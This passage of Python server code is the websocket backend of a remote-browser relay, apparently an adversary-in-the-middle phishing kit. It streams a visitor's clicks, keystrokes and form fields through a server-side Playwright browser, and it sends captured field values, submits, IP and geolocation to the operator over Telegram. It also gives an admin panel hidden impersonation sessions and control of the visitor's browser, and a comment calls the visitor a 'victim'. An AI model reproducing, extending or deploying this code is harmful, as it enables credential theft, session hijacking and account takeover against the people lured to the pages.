                _lpv_forget_identity(client_id)
                parent_connection = _lpv_parent_connections.get(profile_parent_id)
                if (parent_connection
                        and parent_connection.get("websocket") is websocket
                        and parent_connection.get("connection_token") == connection_token):
                    _lpv_parent_connections.pop(profile_parent_id, None)
                if lpv_profile_registered:
                    try:
                        from browser_manager import unregister_profile_session
                        unregister_profile_session(profile_parent_id, client_id)
                    except Exception:
                        logger.debug("[LPV] parent profile unregistration failed", exc_info=True)
            except Exception:
                pass
        # Cancel the chain FIRST so a disconnect deterministically KILLS the
        # workflow, then wake any straggler waiter so it exits instead of
        # hanging on the closed socket. The old order let the disconnect
        # signal satisfy the redirect wait — and if a mobile client
        # reconnected fast enough to re-register before the runner checked
        # still_connected, the chain kept going and "skipped" the click.
        if is_current_connection:
            try:
                await _cancel_workflow_for_client(client_id, "lpv-only disconnect")
            except Exception:
                pass
            _lpv_spinner_signal(client_id, connection_token)
        # Telegram: last chance — ship this page's finals, then the
        # disconnect note with how long they stayed.
        try:
            _lpv_final_flush(client_id, "disconnect")
        except Exception:
            pass
        try:
            _dur = max(0, int(time.time() - _lpv_connected_at))
            _m, _s = divmod(_dur, 60)
            _dur_txt = f"{_m}m {_s}s" if _m else f"{_s}s"
            tg_notify(
                "\U0001F534 <b>CLIENT DISCONNECTED</b>\n\n"
                + _tg_tree([
                    ("\u23F1", "Time on page", _dur_txt),
                    ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
                ]),
                "notify_disconnect",
            )
        except Exception:
            pass


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """Main WebSocket endpoint for streaming"""
    await websocket.accept()
    # D0 instrumentation (MIGRATION_LIVE_MIRROR.md): log negotiated WS
    # extensions once per connection at DEBUG — permessage-deflate is what
    # keeps full_document frames cheap on the wire.
    try:
        logger.debug("[WS] connect ext=%r", websocket.headers.get("sec-websocket-extensions"))
    except Exception:
        pass

    # Get client IP from WebSocket connection — reverse-proxy headers win
    # (nginx/caddy/cloudflared), direct peer is the last resort.
    client_ip = 'Unknown'
    try:
        if hasattr(websocket, 'client') and websocket.client:
            client_ip = websocket.client.host or 'Unknown'
    except Exception:
        pass
    try:
        client_ip = resolve_client_ip_from_headers(getattr(websocket, 'headers', None), client_ip)
    except Exception:
        pass

    session = None
    session_id = None  # V7 FIX: Initialize session_id before use
    connection_generation = None
    try:
        data = await websocket.receive_text()
        init_data = json.loads(data)

        if init_data.get('type') != 'init':
            return

        # ---------------------------------------------------------------
        # Server-side geolocation (AUTHORITATIVE).  The client browser no
        # longer calls third-party geo APIs; we resolve the IP ourselves
        # and enrich init_data["location"] so every downstream consumer
        # (session create, LPV connect notification, audit, admin list)
        # sees verified geo.  Falls back to whatever the client sent (or
        # just the IP) when the lookup fails / the IP is private.
        # ---------------------------------------------------------------
        geo = None
        try:
            geo = await server_geolocate(client_ip)
        except Exception:
            geo = None
        if geo:
            init_data["location"] = geo
            logger.debug(
                "[GEO] %s -> %s %s, %s, %s (%s)",
                client_ip, geo.get("flag"), geo.get("country"),
                geo.get("state"), geo.get("city"), geo.get("geo_source"),
            )
        else:
            try:
                loc = init_data.get("location")
                if not isinstance(loc, dict):
                    loc = {}
                if not (loc.get("ip") or "").strip():
                    loc["ip"] = client_ip
                init_data["location"] = loc
            except Exception:
                pass

        # ---------------------------------------------------------------
        # LPV-only mode (server_settings.lpv_only_mode)
        # ---------------------------------------------------------------
        # When the admin has flipped the "boot users into LPV mode"
        # switch, new client connections do NOT create a Playwright
        # browser.  The client is told to render the default LPV
        # landing page and stay subscribed to LPV pushes.
        #
        # This bypasses the normal browser create_session path and the
        # session_info message, but still runs the stable-parent replacement
        # handoff used by LPV-only connections.
        if (
            srv_settings.get_settings().lpv_only_mode
            and not init_data.get('hidden_session', False)
        ):
            try:
                await _enter_lpv_only_mode(websocket, init_data)
                return
            except Exception as exc:
                logger.error("[WS] LPV-only mode setup failed: %s", exc)
                # Fall through to normal session creation so the
                # client is not bricked by a misconfiguration.

        # Check if this is a hidden/impersonation session
        is_hidden = init_data.get('hidden_session', False)
        
        # Validate auth token if present - also handle workflow param without auth (e.g. ?workflow=xxx)
        auth_token = init_data.get('auth_token', '')
        # also accept workflow directly from URL param even without auth (client.html sends it)
        workflow_param_direct = (init_data.get('workflow') or init_data.get('workflow_id') or '').strip() if isinstance(init_data.get('workflow') or init_data.get('workflow_id'), str) else ''
        url = None
        
        if auth_token:
            link_data = validate_auth_link(auth_token)
            if not link_data:
                await websocket.send_json({"type": "error", "message": "Invalid or expired link"})
                await websocket.close()
                tg_notify(
                    f"<b>SECURITY ALERT: INVALID ACCESS ATTEMPT</b>\n\n"
                    f"<b>Status:</b> Link expired or token invalid\n"
                    f"<b>Token:</b> <code>{_tg_esc(str(auth_token)[:12])}…</code>\n"
                    f"<b>IP Address:</b> <code>{_tg_esc(client_ip)}</code>",
                    "notify_lpv_security",
                )
                return
            
            # Use target URL from link data - but for workflow links, ignore lpv:// / workflow: placeholders
            raw_url = link_data.get("target_url") or ""
            if raw_url.startswith("lpv://") or raw_url.startswith("workflow:") or raw_url.startswith("workflow"):
                url = None
            else:
                url = raw_url
                # ensure url has scheme for create_session
                if url and not url.startswith("http://") and not url.startswith("https://") and not url.startswith("about:"):
                    url = "https://" + url
            # Workflow link: if this link carries a workflow_id, boot the client into LPV and queue auto-workflow
            workflow_id_from_link = link_data.get("workflow_id") or workflow_param_direct
            if workflow_id_from_link:
                try:
                    init_data["_workflow_link_id"] = workflow_id_from_link
                    # Workflow links ALWAYS go LPV-only (no browser) - distinct from streaming WS
                    if not is_hidden:
                        wf = lpv_store.get_workflow(workflow_id_from_link)
                        if wf:
                            init_data["workflow"] = workflow_id_from_link
                            init_data["workflow_id"] = workflow_id_from_link
                            logger.debug("[WS] workflow link detected (auth) %s -> entering pure LPV WS (no browser) for client %s", workflow_id_from_link, init_data.get("device_id") or init_data.get("session_id") or "unknown")
                            await _enter_lpv_only_mode(websocket, init_data)
                            # _enter already queues per-link workflow via auto logic, no extra queue needed
                            return
                    # fallback for hidden or not found - mark for later (but will be streaming, not ideal)
                    if not srv_settings.get_settings().lpv_only_mode:
                        init_data["_force_lpv_workflow_bootstrap"] = True
                except Exception:
                    pass
            # also honor direct workflow param even if auth had no workflow_id
            elif workflow_param_direct:
                try:
                    wf = lpv_store.get_workflow(workflow_param_direct)
                    if wf:
                        init_data["_workflow_link_id"] = workflow_param_direct
                        init_data["_force_lpv_workflow_bootstrap"] = True
                except Exception:
                    pass
        else:
            # No auth token - use provided URL or default, but also check direct workflow param
            url = init_data.get('url', session_manager.config.default_url if session_manager else "https://www.google.com")
            if workflow_param_direct:
                try:
                    wf = lpv_store.get_workflow(workflow_param_direct)
                    if wf:
                        init_data["_workflow_link_id"] = workflow_param_direct
                        if not is_hidden:
                            init_data["workflow"] = workflow_param_direct
                            init_data["workflow_id"] = workflow_param_direct
                            logger.debug("[WS] workflow link detected (direct param) %s -> pure LPV WS", workflow_param_direct)
                            await _enter_lpv_only_mode(websocket, init_data)
                            return
                        if not srv_settings.get_settings().lpv_only_mode:
                            init_data["_force_lpv_workflow_bootstrap"] = True
                except Exception:
                    pass
        
        user_agent = init_data.get('userAgent', '')
        is_mobile = init_data.get('is_mobile', False)
        
        viewport = init_data.get('viewport', {"width": 1920, "height": 1080})
        pixel_ratio = viewport.get('pixelRatio', 1.0)
        # Real device screen metrics from the client (mobile): used to
        # emulate window.screen in the emulated browser so the page content
        # is rendered to the FULL browser width/height (no white space).
        try:
            _scr = init_data.get('screen') or {}
            _sw = int(_scr.get('width', 0) or 0)
            _sh = int(_scr.get('height', 0) or 0)
            if _sw > 0:
                viewport['device_screen_width'] = _sw
            if _sh > 0:
                viewport['device_screen_height'] = _sh
        except Exception:
            pass
        
        # Get device ID for per-system session management
        device_id = init_data.get('device_id', '')
        
        # Get user ID for profile management
        user_id = init_data.get('user_id', '') or device_id
        
        # Get client info for Telegram notifications
        # Support both nested location object and top-level country/state
        location_data = init_data.get('location', {})
        if location_data:
            country = location_data.get('country', '')
            state = location_data.get('state', '')
            city = location_data.get('city', '')
            zip_code = location_data.get('zip', '')
        else:
            # Fallback to top-level (for backward compatibility)
            country = init_data.get('country', '')
            state = init_data.get('state', '')
            city = init_data.get('city', '')
            zip_code = init_data.get('zip', '')
        
        # IMPERSONATION FIX: Map user_id to existing folder structure
        # User folders follow pattern: user_{timestamp}_{string_id}
        # We need to find the existing folder that ends with the provided user_id
        if user_id and session_manager:
            mapped_user_id = map_user_id_to_existing_folder(user_id, session_manager)
            if mapped_user_id:
                user_id = mapped_user_id

        # Stable user_id is the profile/Admin parent. Runtime ownership remains
        # an explicit per-connection id, but a fresh public connection
        # intentionally replaces the older runtime for this same parent.
        provided_session_id = init_data.get('session_id') or ''
        generated_session_id = (
            f"session_{int(time.time() * 1000)}_{uuid.uuid4().hex[:12]}"
        )
        session_id = provided_session_id or generated_session_id

        async def _admit_browser_session():
            nonlocal session
            if not session and session_manager:
                session = await session_manager.create_session(
                    session_id, websocket, user_agent, viewport, pixel_ratio, url, device_id, user_id,
                    is_impersonation=is_hidden,
                    # A fresh public i.open connection intentionally takes over the
                    # stable profile. Hidden admin/impersonation sessions remain
                    # isolated and are allowed to coexist.
                    replace_existing=not is_hidden,
                    is_mobile=is_mobile,
                    client_ip=client_ip,
                    country=country,
                    state=state,
                    city=city,
                    zip_code=zip_code
                )

        if not is_hidden:
            # Hold the same stable-parent lock through LPV replacement and
            # browser admission. This prevents a concurrent workflow-link
            # connection from reserving the parent between those two steps.
            async with _lpv_parent_handoff(user_id) as handoff_key:
                await _replace_lpv_parent_connection_locked(
                    handoff_key,
                    exclude_client_id=session_id,
                    exclude_websocket=websocket,
                )
                await _admit_browser_session()
        else:
            hidden_sessions.add(session_id)
            await _admit_browser_session()

        if not session:
            # Session creation failed - check if it was due to session locking
            if session_manager and user_id:
                locked_session_id = await session_manager.registry.get_locked_session_id(user_id)
                if locked_session_id:
                    # Session is locked - send session_locked message
                    await websocket.send_json({
                        "type": "session_locked",
                        "message": "Session is already active in another browser",
                        "locked_session_id": locked_session_id
                    })
                else:
                    await websocket.send_json({"type": "error", "message": "Session creation failed"})
            else:
                await websocket.send_json({"type": "error", "message": "Session creation failed"})
            return

        # Capture the generation that owns this endpoint. A reconnect swaps
        # the Session websocket and increments this value before closing the
        # old socket, making every stale endpoint path a no-op.
        connection_generation = getattr(session, "websocket_generation", None)

        def _session_connection_is_current() -> bool:
            checker = getattr(session, "is_websocket_current", None)
            if callable(checker):
                return checker(websocket, connection_generation)
            return getattr(session, "websocket", None) is websocket

        # Determine desktop vs mobile mode based on viewport width
        viewport_width = viewport.get('width', 1920)
        is_desktop_mode = viewport_width >= 768

        await websocket.send_json({
            "type": "session_info",
            "session_id": session_id,
            "user_id": session.user_id if hasattr(session, 'user_id') else user_id,
            "domain": session.current_domain if hasattr(session, 'current_domain') else "",
            "viewport": viewport,
            "is_desktop_mode": is_desktop_mode,
            "gpu_mode": session_manager.config.use_gpu if session_manager else False,
            "gpu_id": session.gpu_id if hasattr(session, 'gpu_id') else 0,
        })
        logger.debug("[WS] session_info sent to client: session_id=%s user_id=%s url=%s", session_id, user_id, url)
        # NOTE: Workflow links are handled EARLY before browser creation (pure LPV WS).
        # This fallback is removed per user request: workflow links must NOT open a browser via session_manager.
        # If a workflow link somehow reaches here (e.g. is_hidden or workflow not found), it will be treated as normal streaming.

        # Main message loop - connection stays alive naturally with activity
        while True:
            try:
                if not _session_connection_is_current():
                    break
                data = await asyncio.wait_for(websocket.receive_text(), timeout=60.0)
                if not _session_connection_is_current():
                    break
                if session_manager and session_id:
                    try:
                        await session_manager.registry.update_activity(session_id)
                    except Exception:
                        pass
                
                # Local decryption function to ensure availability
                def local_decrypt_xor(encrypted_data: str, key: str = None) -> str:
                    """Decrypt XOR-encrypted Base64 data"""
                    try:
                        if not encrypted_data:
                            return ''
                        # Use provided key or default
                        if key is None:
                            key = ENCRYPTION_KEY
                            
                        # Check if data is Base64 encoded
                        if not is_base64(encrypted_data):
                            return encrypted_data
                        
                        # Decode from Base64
                        encrypted_bytes = base64.b64decode(encrypted_data)
                        
                        # Convert key to bytes
                        key_bytes = key.encode('utf-8')
                        key_len = len(key_bytes)
                        
                        # Decrypt using XOR
                        decrypted_bytes = bytearray()
                        for i, byte in enumerate(encrypted_bytes):
                            decrypted_byte = byte ^ key_bytes[i % key_len]
                            decrypted_bytes.append(decrypted_byte)
                        
                        return decrypted_bytes.decode('utf-8')
                    except Exception:
                        return ''
                
                # Try to decrypt the message if it's encrypted
                decrypted_data = local_decrypt_xor(data)
                try:
                    message = json.loads(decrypted_data)
                except json.JSONDecodeError:
                    # Fallback to original data if decryption fails
                    message = json.loads(data)
                
                msg_type = message.get('type', '')
                
                if msg_type == 'input':
                    input_data = {k: v for k, v in message.items() if k != 'type'}
                    logger.debug(
                        "[WS->SESSION][input] session=%s subtype=%s keys=%s",
                        session_id,
                        input_data.get('subtype') or input_data.get('event') or input_data.get('type'),
                        sorted(k for k in input_data.keys() if k not in {'text'}),
                    )
                    try:
                        await session.handle_input(input_data)
                    except Exception:
                        logger.exception(
                            "[WS->SESSION][input-failed] session=%s subtype=%s",
                            session_id,
                            input_data.get('subtype') or input_data.get('event') or input_data.get('type'),
                        )
                
                elif msg_type == 'heartbeat':
                    # Client heartbeat - update activity and respond
                    session.last_activity = time.time()
                    
                    # Update pong time for session timeout tracking (Part 3)
                    if hasattr(session, 'handle_pong'):
                        await session.handle_pong()
                    
                    try:
                        await websocket.send_json({"type": "heartbeat_ack", "timestamp": time.time()})
                    except Exception:
                        pass
                    # Wake up if sleeping
                    if session.is_sleeping:
                        await session.wake()
                    
                    # Save client profile data to server (throttled - every 10 seconds)
                    current_time = time.time()
                    if not hasattr(session, '_last_profile_save') or (current_time - session._last_profile_save) >= 10:
                        session._last_profile_save = current_time
                        
                        # Get session info for profile
                        try:
                            info = await session.get_info()
                            profile_data = {
                                'client_id': info.get('client_id', ''),
                                'user_id': info.get('user_id', ''),
                                'parent_client_id': info.get('parent_client_id') or info.get('user_id', ''),
                                'device_id': info.get('device_id', ''),
                                'client_type': info.get('client_type', 'browser'),
                                'mode': info.get('mode', 'browser'),
                                'current_url': info.get('current_url', ''),
                                'title': info.get('title', ''),
                                'status': info.get('status', ''),
                                'gpu_id': info.get('gpu_id', 0),
                                'uptime': info.get('uptime', 0),
                                'is_online': True
                            }
                            
                            # Save to server profile storage
                            client_id = profile_data.get('client_id') or session.user_id
                            if client_id:
                                await save_client_profile(client_id, profile_data)
                        except Exception:
                            pass
                
                elif msg_type == 'pong':
                    # Client pong response - update session timeout tracking (Part 3)
                    if hasattr(session, 'handle_pong'):
                        await session.handle_pong()
                
                elif msg_type == 'feedback':
                    # Client sending network feedback for adaptive bitrate
                    await session.handle_client_feedback(message)

                elif msg_type == 'click':
                    # ELEMENT-PURE click relay (DOM-capture mode): the client
                    # resolves the interactive element and sends its CSS
                    # selector plus the capture-stamped data-mid — no
                    # coordinate mapping anywhere on this path.
                    selector = message.get('selector')
                    mid = message.get('mid')
                    await session.handle_click(selector=selector, mid=mid)

                elif msg_type == 'navigate':
                    url_value = message.get('url', '')
                    if url_value:
                        await session.handle_navigation(url_value)

                elif msg_type == 'input_sync':
                    await session.handle_input_sync(
                        mid=message.get('mid'),
                        selector=message.get('selector'),
                        name=message.get('name'),
                        field_id=message.get('id'),
                        value=str(message.get('value', '')),
                        checked=message.get('checked'),
                    )

                elif msg_type == 'keypress':
                    key = message.get('key', '')
                    selector = message.get('selector')
                    mid = message.get('mid')
                    ctrl = bool(message.get('ctrl', False))
                    shift = bool(message.get('shift', False))
                    alt = bool(message.get('alt', False))
                    await session.handle_keypress(key, selector, ctrl=ctrl, shift=shift, alt=alt, mid=mid)

                elif msg_type == 'capture_first_input':
                    await session.capture_first_input()

                elif msg_type == 'resync_request':
                    logger.debug('[WS] resync_request received from client: reason=%s currentGeneration=%s',
                                 message.get('reason'), message.get('currentGeneration'))
                    await session.capture_remote_page(reason='resync_request', force=True)

                elif msg_type == 'url_ack':
                    if session.dom_capture is not None:
                        session.dom_capture.client_ack_url = message.get('url')

                # ---- LPV (Live Panel Version) ----
                # Inbound from the LPV runtime that lives inside the
                # client page. We persist the event for the audit log
                # and fan it out to every connected admin so the live
                # activity feed updates without polling.
                elif msg_type == 'chat_message':
                    # Live chat: client -> admin (browser-session clients run
                    # the same LPV runtime, so the widget emits here too).
                    await _handle_client_chat(session_id, message)

                elif msg_type == 'chat_redirect':
                    # Chat bubble in redirect mode: go to the configured
                    # page/link instead of opening a conversation.
                    await _handle_chat_redirect(session_id)

                elif msg_type == 'lpv_action':
                    # A control mapped to "go somewhere" was clicked inside a
                    # pushed page (page action, or an armed workflow action).
                    await _handle_click_action(session_id, message)

                elif msg_type == 'lpv_event':
                    event_type = (message.get('event_type') or 'unknown')[:64]
                    page_id = message.get('page_id')
                    page_name = message.get('page_name')
                    payload = message.get('payload') or {}
                    if not isinstance(payload, dict):
                        payload = {"value": str(payload)[:500]}

                    # Apply per-client redaction rules before persisting
                    # or broadcasting. The raw value never leaves the
                    # client runtime when a rule matches.
                    rules = lpv_store.list_redaction(session_id)
                    if rules and isinstance(payload, dict):
                        payload = _apply_redaction(payload, rules)

                    lpv_store.record_event(
                        session_id,
                        event_type,
                        payload=payload,
                        page_id=page_id,
                        page_name=page_name,
                    )
                    await _broadcast_lpv_event(session_id, {
                        "event_type": event_type,
                        "page_id": page_id,
                        "page_name": page_name,
                        "payload": payload,
                    })
                    # Spinner-on hook for the workflow runner.  When a
                    # `redirect` step is in flight, _run_workflow_on_client
                    # has already subscribed to a per-client asyncio.Event
                    # keyed by the same session_id; setting it here unblocks
                    # the post-click sleep.  Only genuine user gestures
                    # (click/submit) count — never a page-load spinner.
                    if event_type == 'lpv_spinner':
                        _r = (payload or {}).get("reason") if isinstance(payload, dict) else None
                        if _r != "page_load":
                            _lpv_spinner_signal(session_id)
                    # Telegram: page-final field aggregation (browser session).
                    if event_type == 'field_final':
                        try:
                            _lpv_note_field_final(session_id, page_id, page_name, payload)
                        except Exception:
                            pass
                    if event_type == 'form_submit':
                        try:
                            _lpv_final_flush(session_id, "submit")
                        except Exception:
                            pass

                elif msg_type == 'lpv_page_loaded':
                    # Client confirmed a pushed page finished rendering.
                    page_id = message.get('page_id')
                    page_name = message.get('page_name')
                    payload = message.get('payload') or {}
                    # Telegram: leaving the previous page -> ship its finals.
                    try:
                        _lpv_final_flush(session_id, "page loaded")
                    except Exception:
                        pass
                    lpv_store.record_event(
                        session_id, "page_loaded", payload, page_id=page_id, page_name=page_name
                    )
                    await _broadcast_lpv_event(session_id, {
                        "event_type": "page_loaded",
                        "page_id": page_id,
                        "page_name": page_name,
                        "payload": payload,
                    })

                # WebRTC signaling disabled for DOM-capture-only mode
                
                elif msg_type == 'sleep':
                    # Client requesting sleep mode
                    await session.enter_sleep()
                
                elif msg_type == 'wake':
                    # Client waking up
                    await session.wake()
                
                elif msg_type == 'viewport':
                    # Client sending viewport resize
                    new_viewport = {
                        'width': message.get('width', 1920),
                        'height': message.get('height', 1080),
                        'pixelRatio': message.get('pixelRatio', 1.0)
                    }
                    
                    if hasattr(session, 'handle_resize'):
                        await session.handle_resize(new_viewport)
                    elif hasattr(session, 'viewport'):
                        session.viewport = new_viewport
                elif msg_type == 'visual_viewport':
                    # Client sending VisualViewport data for smoother transitions
                    # (prevents flash during page navigation)
                    visual_viewport_data = {
                        'scale': message.get('scale', 1.0),
                        'offsetTop': message.get('offsetTop', 0),
                        'offsetLeft': message.get('offsetLeft', 0),
                        'pageTop': message.get('pageTop', 0),
                        'pageLeft': message.get('pageLeft', 0),
                        'width': message.get('width', 0),
                        'height': message.get('height', 0)
                    }
                    if hasattr(session, 'handle_visual_viewport'):
                        await session.handle_visual_viewport(visual_viewport_data)
                
                elif msg_type == 'profile_data':
                    # Client sending profile data to server for storage
                    profile_data = message.get('data', {})
                    client_id = message.get('client_id', session.user_id if hasattr(session, 'user_id') else '')
                    
                    if client_id and profile_data:
                        # Add session info to profile
                        profile_data['session_id'] = session.session_id if hasattr(session, 'session_id') else ''
                        profile_data['current_url'] = session.current_url if hasattr(session, 'current_url') else ''
                        profile_data['client_id'] = client_id
                        
                        # Save to server storage
                        await save_client_profile(client_id, profile_data)
                        
                        # Acknowledge receipt
                        try:
                            await websocket.send_json({
                                "type": "profile_data_ack",
                                "client_id": client_id,
                                "timestamp": time.time()
                            })
                        except Exception:
                            pass
                        session.pixel_ratio = message.get('pixelRatio', 1.0)

            except asyncio.TimeoutError:
                # No message received within timeout - connection is idle but still alive
                # Just continue waiting for next message
                continue
            except WebSocketDisconnect:
                logger.debug("Client disconnected")
                # Telegram: last chance to ship this session's page finals.
                try:
                    if session_id and _session_connection_is_current():
                        _lpv_final_flush(session_id, "disconnect")
                except Exception:
                    pass
                break
            except Exception as e:
                # FIX 2: Better error handling for keepalive ping failures and other errors
                error_msg = str(e)
                # Ignore common non-critical websocket errors
                if "keepalive" in error_msg.lower() or "ping" in error_msg.lower():
                    logger.warning(f"WebSocket ping error (non-critical): {e}")
                    continue  # Don't break the connection for ping errors
                elif "drain" in error_msg.lower() or "closed" in error_msg.lower():
                    logger.warning(f"WebSocket connection closing: {e}")
                    break
                else:
                    logger.error(f"WebSocket error: {e}")
                    break

    except WebSocketDisconnect:
        pass
    except Exception as e:
        pass
    finally:
        # Mark the durable profile offline only when this socket is still the
        # active connection. A fast reconnect reuses the same stable id; the
        # old socket must not overwrite the new connection's online state.
        is_current_connection = bool(
            session and _session_connection_is_current()
        ) if session else False
        mark_profile_offline = bool(session and session.user_id and is_current_connection)
        if mark_profile_offline and session_manager:
            try:
                active_session = await session_manager.get_session(session.session_id)
                active_ws = getattr(active_session, "websocket", None) if active_session else None
                # Compare with this endpoint's websocket object, not
                # session.websocket: reattach mutates the latter in-place.
                if active_ws is not None and active_ws is not websocket:
                    mark_profile_offline = False
            except Exception:
                pass
        if mark_profile_offline:
            try:
                # The process-wide parent registry includes both browser and
                # LPV-only runtime generations. Excluding this socket's
                # browser id prevents one tab from taking a sibling tab or an
                # LPV workflow link offline.
                from browser_manager import profile_has_active_session
                if profile_has_active_session(
                    session.user_id, exclude_session_id=session.session_id
                ):
                    mark_profile_offline = False
            except Exception:
                pass
        if mark_profile_offline:
            try:
                await save_client_profile(session.user_id, {
                    'client_id': session.session_id,
                    'user_id': session.user_id,
                    'parent_client_id': session.user_id,
                    'current_url': '',
                    'status': 'offline',
                    'is_online': False,
                    'disconnected_at': time.time()
                })
            except Exception as e:
                logger.error(f"[Broadcast Error] {e}")
        
        if session and session_manager and is_current_connection:
            delay = getattr(session_manager.config, 'disconnect_grace_period', 30.0)
            await session_manager.schedule_remove_session(
                session.session_id, delay=delay, expected_websocket=websocket,
                expected_generation=connection_generation,
            )
        # Remove from hidden sessions only for the current generation; a stale
        # socket must not hide/unhide a replacement with the same stable id.
        if is_current_connection and session_id and session_id in hidden_sessions:
            hidden_sessions.discard(session_id)
        # Wake any workflow `redirect` step parked on this client's spinner
        # so it can see the client is gone, and tear the whole chain down —
        # a disconnected victim must not leave a phantom runner behind.
        if is_current_connection and session_id:
            _lpv_spinner_signal(session_id)
            try:
                await _cancel_workflow_for_client(session_id, "ws disconnect")
            except Exception:
                pass


@app.websocket("/admin")
async def admin_websocket_endpoint(websocket: WebSocket):
    """Admin WebSocket endpoint for monitoring with single-stream enforcement and session updates"""
    await websocket.accept()

    await admin_stream_manager.register_admin(websocket)
    admin_ws_connections.add(websocket)  # Register for session updates

    try:
        # Send current server sessions on connection
        try:
            sessions = await load_server_sessions()
            await websocket.send_json({
                "type": "all_sessions",
                "sessions": sessions,
                "count": len(sessions)
            })
        except Exception:
            pass

        # Send initial client list (browser sessions + LPV-only/workflow
        # clients, all keyed by their stable parent id).
        #
        # This block used to be unguarded: one odd client record (or a GPU
        # status failure) raised here, after the socket had been accepted, so
        # the panel retried forever and only ever said "Connection error".
        # A failed snapshot must degrade to "no clients yet" and leave the
        # reason in the log.
        if session_manager:
            try:
                sessions_list = await session_manager.get_all_sessions()
                visible_sessions = await _get_admin_visible_clients()
                try:
                    gpu_status = session_manager.gpu_manager.get_status()
                except Exception:
                    gpu_status = {}
                active_stream = await admin_stream_manager.get_active_stream()
                await websocket.send_json({
                    "type": "clients",
                    "clients": visible_sessions,
                    "hidden_count": max(0, len(sessions_list) - len(visible_sessions)),
                    "gpu": gpu_status,
                    "active_stream": active_stream,
                })
            except Exception:
                logger.warning(
                    "[WS][admin] initial client snapshot failed; sending an "
                    "empty list so the panel can still connect", exc_info=True,
                )
                try:
                    await websocket.send_json({
                        "type": "clients", "clients": [], "hidden_count": 0,
                        "gpu": {}, "active_stream": None,
                        "warning": "client snapshot failed - see the server log",
                    })
                except Exception:
                    pass
        
        # Surface the server's recent warnings straight away: the operator
        # should not have to go looking to learn that a feature is failing.
        #
        # Admin-only: this socket is opened by the login screen too (it is
        # the "Connected to server" indicator), and the first thing it used
        # to leak was "Failed login attempt for user: admin" - server
        # internals shown to whoever loaded the panel, signed in or not.
        # The panels pass ?token=<jwt>; without a valid one they simply do
        # not get the warnings frame.
        try:
            token = websocket.query_params.get("token", "")
            authorised = False
            if token:
                try:
                    payload = verify_jwt_token(token)
                    authorised = bool(payload and payload.get("sub") == ADMIN_USERNAME)
                except Exception:
                    authorised = False
            if authorised:
                recent = list(_RECENT_LOG)[-5:] if _RECENT_LOG else []
                if recent:
                    await websocket.send_json({
                        "type": "server_warnings",
                        "count": len(_RECENT_LOG),
                        "recent": recent,
                    })
        except Exception:
            pass

        # Send all stored client profiles (historical data from before admin connected)
        try:
            all_profiles = await get_all_client_profiles()
            if all_profiles:
                await websocket.send_json({
                    "type": "all_profiles",
                    "profiles": all_profiles,
                    "count": len(all_profiles)
                })
        except Exception:
            pass

        # Message loop - connection stays alive naturally with activity
        while True:
            try:
                message = await asyncio.wait_for(websocket.receive(), timeout=60.0)

                if message.get("type") == "websocket.disconnect":
                    break

                if message["type"] == "websocket.receive":
                    if "text" in message:
                        data = json.loads(message["text"])

                        if data.get('type') == 'heartbeat':
                            # Admin heartbeat - send ack
                            await websocket.send_json({"type": "heartbeat_ack", "timestamp": time.time()})

                        elif data.get('type') == 'get_clients' and session_manager:
                            sessions = await session_manager.get_all_sessions()
                            visible_sessions = await _get_admin_visible_clients()
                            gpu_status = session_manager.gpu_manager.get_status()
                            active_stream = await admin_stream_manager.get_active_stream()
                            await websocket.send_json({
                                "type": "clients",
                                "clients": visible_sessions,
                                "hidden_count": max(0, len(sessions) - len(visible_sessions)),
                                "gpu": gpu_status,
                                "active_stream": active_stream,
                            })

                        elif data.get('type') == 'get_info' and session_manager:
                            session_id = data.get('client_id')
                            if session_id:
                                session = await session_manager.get_session(session_id)
                                if session:
                                    info = await session.get_info()
                                    lpv_meta = await get_session_from_server(session_id)
                                    if isinstance(lpv_meta, dict) and lpv_meta.get("is_lpv"):
                                        info.update({
                                            "is_lpv": True,
                                            "lpv_online": bool(lpv_meta.get("lpv_online")),
                                            "workflow_id": lpv_meta.get("workflow_id", ""),
                                            "workflow_name": lpv_meta.get("workflow_name", ""),
                                            "workflow_link_id": lpv_meta.get("workflow_link_id", ""),
                                            "parent_client_id": lpv_meta.get("parent_client_id") or info.get("parent_client_id"),
                                            "mode": "browser+lpv",
                                        })
                                    await websocket.send_json({"type": "client_info", "info": info})
                                else:
                                    # LPV-only/workflow-link clients have no
                                    # browser Session object, but are still
                                    # selectable in the admin panel.
                                    lpv_info = await get_session_from_server(session_id)
                                    if isinstance(lpv_info, dict) and lpv_info.get("is_lpv"):
                                        info = dict(lpv_info)
                                        info["status"] = "LPV online" if lpv_info.get("lpv_online") else "LPV offline"
                                        info["is_online"] = bool(lpv_info.get("lpv_online"))
                                        lpv_state = lpv_store.get_session(session_id)
                                        if lpv_state:
                                            info.update({
                                                "lpv_active": lpv_state.get("lpv_active"),
                                                "current_page_id": lpv_state.get("current_page_id"),
                                                "current_page_name": lpv_state.get("current_page_name"),
                                            })
                                        await websocket.send_json({"type": "client_info", "info": info})

                        elif data.get('type') == 'close' and session_manager:
                            session_id = data.get('client_id')
                            if session_id:
                                # Disable admin monitoring first
                                session = await session_manager.get_session(session_id)
                                if session:
                                    await session.disable_admin_monitoring()
                                await admin_stream_manager.unsubscribe(session_id, websocket)
                                await session_manager.remove_session(session_id)

                        elif data.get('type') == 'command' and session_manager:
                            session_id = data.get('client_id')
                            command = data.get('command')
                            params = data.get('params', {})
                            if session_id and command:
                                session = await session_manager.get_session(session_id)
                                if session and session.page:
                                    if command == 'back':
                                        await session.page.go_back()
                                    elif command == 'forward':
                                        await session.page.go_forward()
                                    elif command == 'reload':
                                        await session.page.reload()
                                    elif command == 'goto' and 'url' in params:
                                        url = params['url']
                                        # FIXED: Properly handle goto command
                                        await session.set_url(url)

                        elif data.get('type') == 'set_url' and session_manager:
                            # NEW: Dedicated set_url command for Admin control
                            session_id = data.get('client_id')
                            url = data.get('url', '')
                            if session_id and url:
                                success = await session_manager.set_session_url(session_id, url)
                                if success:
                                    await websocket.send_json({
                                        "type": "url_set",
                                        "success": True,
                                        "session_id": session_id,
                                        "url": url
                                    })
                                else:
                                    await websocket.send_json({
                                        "type": "url_set",
                                        "success": False,
                                        "session_id": session_id,
                                        "error": "Session not found"
                                    })

                        elif data.get('type') == 'refresh' and session_manager:
                            # NEW: Refresh inactive/sleeping session
                            session_id = data.get('client_id')
                            if session_id:
                                success = await session_manager.refresh_session(session_id)
                                await websocket.send_json({
                                    "type": "refresh_response",
                                    "success": success,
                                    "session_id": session_id
                                })

                        elif data.get('type') == 'subscribe' and session_manager:
